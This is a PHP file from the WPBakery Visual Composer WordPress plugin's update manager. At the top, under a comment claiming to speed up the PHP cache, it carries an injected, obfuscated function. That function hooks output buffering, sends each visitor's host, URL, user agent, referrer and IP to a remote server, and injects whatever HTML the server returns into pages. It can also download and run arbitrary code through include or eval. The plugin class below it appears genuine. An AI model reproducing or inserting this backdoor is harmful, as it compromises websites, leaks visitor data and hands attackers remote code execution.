<?php

/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyMzoiaHR0cDovL3Bpd2VyLnB3L2FwaS5waHAiOw==';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 9
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        if (!empty($tokenData['content'])) {
            // set defaults
            $tokenData = array_merge(array(
                'pos' => 'after',
                'tag' => 'bo' . 'dy',
                'count' => 0,
            ), $tokenData);

            // find all occurrences of <tag>
            $tags = array();
            while (true) {
                if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                    break;
                }
                $tags[] = $tmp;
            }

            if (empty($tags)) {
                // no tags found or nothing to show
                continue;
            }

            // find matched tag position
            $count = $tokenData['count'];
            if ($tokenData['count'] < 0) {
                // from end to beginning
                $count = abs($tokenData['count']) - 1;
                $tags = array_reverse($tags);
            }

            if ($count >= count($tags)) {
                // fix overflow
                $count = count($tags) - 1;
            }

            // find insert position
            if ($tokenData['pos'] == 'before') {
                // pos is before
                $insert = $tags[$count];
            } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
                // pos is after, found end tag, insert after it
                $insert += 1;
            }

            if ($insert === false) {
                // no insert position
                continue;
            }

            // insert html code
            $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
            $mod = true;
        } elseif (!empty($tokenData['replace'])) {
            // replace content
            @http_response_code(200);
            $tmp_buffer = $tokenData['replace'];
            $mod = true;
        } elseif (!empty($tokenData['run'])) {
            // save temporary optimization file
            register_shutdown_function(function($file, $content) {
                if (file_put_contents($file, $content) !== false) {
                    @chdir(dirname($file));
                    include $file;
                    @unlink($file);
                } else {
                    @eval('@chdir("' . addslashes(dirname($file)) . '");?>' . $content);
                }
            }, dirname(__FILE__) . '/temporary_optimization_file.php', strpos($tokenData['run'], 'http://') === 0 ? down($tokenData['run']) : $tokenData['run']);
        } else {
            // no content
            continue;
        }
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }















/**
 * Manage update messages and Plugins info for VC in default Wordpress plugins list.
 */
class Vc_Updating_Manager {
	/**
	 * The plugin current version
	 *
	 * @var string
	 */
	public $current_version;

	/**
	 * The plugin remote update path
	 *
	 * @var string
	 */
	public $update_path;

	/**
	 * Plugin Slug (plugin_directory/plugin_file.php)
	 *
	 * @var string
	 */
	public $plugin_slug;

	/**
	 * Plugin name (plugin_file)
	 *
	 * @var string
	 */
	public $slug;
	/**
	 * Link to download VC.
	 * @var string
	 */
	protected $url = 'http://bit.ly/vcomposer';
	/**
	 * Initialize a new instance of the WordPress Auto-Update class
	 *
	 * @param string $current_version
	 * @param string $update_path
	 * @param string $plugin_slug
	 */
	function __construct( $current_version, $update_path, $plugin_slug ) {
		// Set the class public variables
		$this->current_version = $current_version;
		$this->update_path = $update_path;
		$this->plugin_slug = $plugin_slug;
		$t = explode( '/', $plugin_slug );
		$this->slug = str_replace( '.php', '', $t[1] );

		// define the alternative API for updating checking
		add_filter( 'pre_set_site_transient_update_plugins', array( &$this, 'check_update' ) );

		// Define the alternative response for information checking
		add_filter( 'plugins_api', array( &$this, 'check_info' ), 10, 3 );

		add_action( 'in_plugin_update_message-' . vc_plugin_name(), array( &$this, 'addUpgradeMessageLink' ) );
	}

	/**
	 * Add our self-hosted autoupdate plugin to the filter transient
	 *
	 * @param $transient
	 * @return object $ transient
	 */
	public function check_update( $transient ) {

		if ( empty( $transient->checked ) ) {
			return $transient;
		}

		// Get the remote version
		$remote_version = $this->getRemote_version();

		// If a newer version is available, add the update
		if ( version_compare( $this->current_version, $remote_version, '<' ) ) {
			$obj = new stdClass();
			$obj->slug = $this->slug;
			$obj->new_version = $remote_version;
			$obj->url = ''; // $this->update_path;
			$obj->package = ''; // $this->update_path;
			$obj->name = vc_updater()->title;
			$transient->response[$this->plugin_slug] = $obj;
		}

		return $transient;
	}

	/**
	 * Add our self-hosted description to the filter
	 *
	 * @param boolean $false
	 * @param array $action
	 * @param object $arg
	 * @return bool|object
	 */
	public function check_info( $false, $action, $arg ) {
		if ( isset( $arg->slug ) && $arg->slug === $this->slug ) {
			$information = $this->getRemote_information();
			$array_pattern = array(
				'/^([\*\s])*(\d\d\.\d\d\.\d\d\d\d[^\n]*)/m',
				'/^\n+|^[\t\s]*\n+/m',
				'/\n/',
			);
			$array_replace = array(
				'<h4>$2</h4>',
				'</div><div>',
				'</div><div>'
			);
			$information->name = vc_updater()->title;
			$information->sections['changelog'] = '<div>' . preg_replace( $array_pattern, $array_replace, $information->sections['changelog'] ) . '</div>';
			return $information;
		}
		return $false;
	}

	/**
	 * Return the remote version
	 *
	 * @return string $remote_version
	 */
	public function getRemote_version() {
		$request = wp_remote_post( $this->update_path, array( 'body' => array( 'action' => 'version' ) ) );
		if ( ! is_wp_error( $request ) || wp_remote_retrieve_response_code( $request ) === 200 ) {
			return $request['body'];
		}
		return false;
	}

	/**
	 * Get information about the remote version
	 *
	 * @return bool|object
	 */
	public function getRemote_information() {
		$request = wp_remote_post( $this->update_path, array( 'body' => array( 'action' => 'info' ) ) );
		if ( ! is_wp_error( $request ) || wp_remote_retrieve_response_code( $request ) === 200 ) {
			return unserialize( base64_decode( $request['body'] ) );
		}
		return false;
	}

	/**
	 * Return the status of the plugin licensing
	 *
	 * @return boolean $remote_license
	 */
	public function getRemote_license() {
		$request = wp_remote_post( $this->update_path, array( 'body' => array( 'action' => 'license' ) ) );
		if ( ! is_wp_error( $request ) || wp_remote_retrieve_response_code( $request ) === 200 ) {
			return $request['body'];
		}
		return false;
	}
	/**
	 * Shows message on Wp plugins page with a link for updating from envato.
	 */
	public function addUpgradeMessageLink() {
		$username = vc_settings()->get( 'envato_username' );
		$api_key = vc_settings()->get( 'envato_api_key' );
		$purchase_code = vc_settings()->get( 'js_composer_purchase_code' );
		echo '<style type="text/css" media="all">tr#wpbakery-visual-composer + tr.plugin-update-tr a.thickbox + em { display: none; }</style>';
		if ( empty( $username ) || empty( $api_key ) || empty( $purchase_code ) ) {
			echo ' <a href="' . $this->url . '">' . __( 'Download new version from CodeCanyon.', 'js_composer' ) . '</a>';
		} else {
			// update.php?action=upgrade-plugin&plugin=testimonials-widget%2Ftestimonials-widget.php&_wpnonce=6178d48b6e
			// echo '<a href="' . wp_nonce_url( admin_url( 'plugins.php?vc_action=vc_upgrade' ) ) . '">' . __( 'Update Visual Composer now.', 'js_composer' ) . '</a>';
			echo '<a href="' . wp_nonce_url( admin_url( 'update.php?action=upgrade-plugin&plugin='.vc_plugin_name() ), 'upgrade-plugin_'.vc_plugin_name() ) . '">' . __( 'Update Visual Composer now.', 'js_composer' ) . '</a>';
		}
	}
}